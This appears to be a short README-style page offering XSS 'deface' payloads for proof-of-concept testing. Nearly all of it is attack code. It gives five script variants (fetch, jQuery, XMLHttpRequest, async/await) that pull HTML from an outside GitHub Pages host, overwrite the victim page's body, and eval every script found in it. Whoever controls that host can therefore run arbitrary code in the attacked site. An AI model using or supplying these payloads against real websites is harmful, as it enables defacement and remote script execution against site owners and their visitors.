#  This is my Deface page for PoC
use the following paylods for testing .
**basic javascript paylod using fetch**
```
<script> fetch('https://karthikdude.github.io/Deface/') .then(response => response.text()) .then(html => { document.body.innerHTML = html; const scripts = document.body.getElementsByTagName('script'); for (let script of scripts) { eval(script.innerText); } }); </script>
here are a few similar XSS deface payloads:

1. **Using jQuery to load and execute external content:**
   ```html
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
   $.get('https://karthikdude.github.io/Deface/', function(data) {
       $('body').html(data);
       const scripts = document.body.getElementsByTagName('script');
       for (let script of scripts) {
           eval(script.innerText);
       }
   });
   </script>
   ```

2. **Using vanilla JavaScript to load and execute external content:**
   ```html
   <script>
   fetch('https://karthikdude.github.io/Deface/')
       .then(response => response.text())
       .then(html => {
           document.body.innerHTML = html;
           const scripts = document.body.getElementsByTagName('script');
           for (let script of scripts) {
               eval(script.innerText);
           }
       });
   </script>
   ```

3. **Using XMLHttpRequest to load and execute external content:**
   ```html
   <script>
   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'https://karthikdude.github.io/Deface/', true);
   xhr.onreadystatechange = function () {
       if (xhr.readyState == 4 && xhr.status == 200) {
           document.body.innerHTML = xhr.responseText;
           const scripts = document.body.getElementsByTagName('script');
           for (let script of scripts) {
               eval(script.innerText);
           }
       }
   };
   xhr.send();
   </script>
   ```

4. **Using async/await with Fetch API:**
   ```html
   <script>
   async function deface() {
       const response = await fetch('https://karthikdude.github.io/Deface/');
       const html = await response.text();
       document.body.innerHTML = html;
       const scripts = document.body.getElementsByTagName('script');
       for (let script of scripts) {
           eval(script.innerText);
       }
   }
   deface();
   </script>
   ```

1
